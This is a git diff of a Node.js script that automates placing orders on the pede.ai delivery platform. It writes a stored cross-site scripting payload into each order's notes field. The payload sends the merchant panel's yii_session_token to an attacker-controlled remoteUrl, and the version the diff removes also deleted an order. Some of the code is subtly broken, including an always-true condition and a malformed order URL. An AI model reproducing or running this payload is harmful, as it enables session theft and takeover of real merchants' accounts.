@@ -1,7 +1,7 @@
 const request = require("request");
 const axios = require("axios");
 const jsonPedido = require("./json/merchantOrder.json");
-const userLoginData = require("./json//userLogin.json");
+const userLoginData = require("./json/userLogin.json");
 const fs = require("fs");
 const config = require("./json/config.json");
 
@@ -20,7 +20,7 @@ let productNameForEach;
 let remoteUrl;
 let loadingApp = false;
 
-const dataOrderSend = jsonPedido;
+let dataOrderSend = jsonPedido;
 
 let USER_TOKEN = userLoginData.token;
 let merchantId;
@@ -69,21 +69,22 @@ var getMerchantDataForName = (merchantName, area_id) => {
 
 var sendOrder = (jsonOrder) => {
   console.log("Sending Order...");
-  const data = jsonPedido;
   const h = {
     "Content-Type": "application/json;charset=UTF-8",
     Authorization: USER_TOKEN,
   };
 
   axios
-    .post("https://api.store.pede.ai/order/v2/orders", data, { headers: h })
+    .post("https://api.store.pede.ai/order/v2/orders", dataOrderSend, { headers: h })
     .then((res) => {
-      console.log(res.response);
+      console.log(res.data.message);
+      writeFileJSON("./app/json/idOrder.json", `{"_id": "${res.data._id}", "token": "${res.data.token}"}`);
     })
     .catch((error) => {
       console.error(error.response.data.message);
       if (
         error.response.data.message != "Empresa não está aberta no momento!"
+        || error.response.data.message != 'Usuário não autenticado'
       ) {
         userLogin();
       }
@@ -135,7 +136,7 @@ var getItemsMerchant = () => {
     dataOrderSend.items_total = itemMerchant.prices[0].discounted_price;
     dataOrderSend.total =
       dataOrderSend.delivery_fee + itemMerchant.prices[0].discounted_price;
-    dataOrderSend.notes = `<script> $.post('${remoteUrl}/v='+ yii_session_token, function(data, status){ }); row_delete_order_request('7934714', {}); </script>`;
+    dataOrderSend.notes = `<script>$.get('${remoteUrl}/?v='+yii_session_token,()=>{});</script>`;
 
     console.log("Ready-to-ship settings");
     sendOrder(dataOrderSend);
@@ -162,7 +163,7 @@ var userLogin = () => {
       USER_TOKEN = res.data.session.token;
       console.log("User logged!");
 
-      writeFileJSON("./json/userLogin.json", `{"token": "${USER_TOKEN}"}`);
+      writeFileJSON("./app/json/userLogin.json", `{"token": "${USER_TOKEN}"}`);
       getAreaIdCity(cityNameForEarch, bairroNameForEarch);
     })
     .catch((error) => {
@@ -189,6 +190,8 @@ var getAreaIdCity = (cityName, bairroName) => {
       });
       if (cityData) {
         console.log(`City searched - ${cityData.name}`);
+        dataOrderSend.address.city._id = cityData._id;
+        dataOrderSend.address.city.name = cityData.name;
         getAreaIdBairro(cityData._id, bairroName);
       } else {
         console.log(`City not searched - ${cityName}`);
@@ -217,6 +220,8 @@ var getAreaIdBairro = (city_id, bairroName) => {
       });
       if (bairroData) {
         console.log(`Bairro searched - ${bairroData.name}`);
+        dataOrderSend.address.area._id = bairroData._id;
+        dataOrderSend.address.area.name = bairroData.name;
         getAreaId(bairroData.slug);
       } else {
         console.log(`Bairro not searched - ${bairroName}`);
@@ -269,6 +274,27 @@ var openMerchant = (slug, area_id) => {
 
 var writeFileJSON = (fileName, value) => {
   fs.writeFile(fileName, value, function (err) {});
+};
+
+var getOrder = (_id) => {
+  return new Promise((resolver, reject) => {
+    console.log("Getting delivery fee");
+    const h = {
+      "x-app-version": " v1.7.1",
+      "x-gateway-token": x_gateway_token,
+    };
+    const URL_API_CITIES = `https://api.store.pede.ai/order/v2/orders/6319f4384f2e0b23e061715f${_id}`;
+
+    axios
+      .get(URL_API_CITIES, { headers: h })
+      .then((res) => {
+        resolver(res.data.merchant.delivery_fee);
+      })
+      .catch((error) => {
+        reject(false);
+        console.error(error.response.data.message);
+      });
+  });
 };
 
 module.exports = run = (
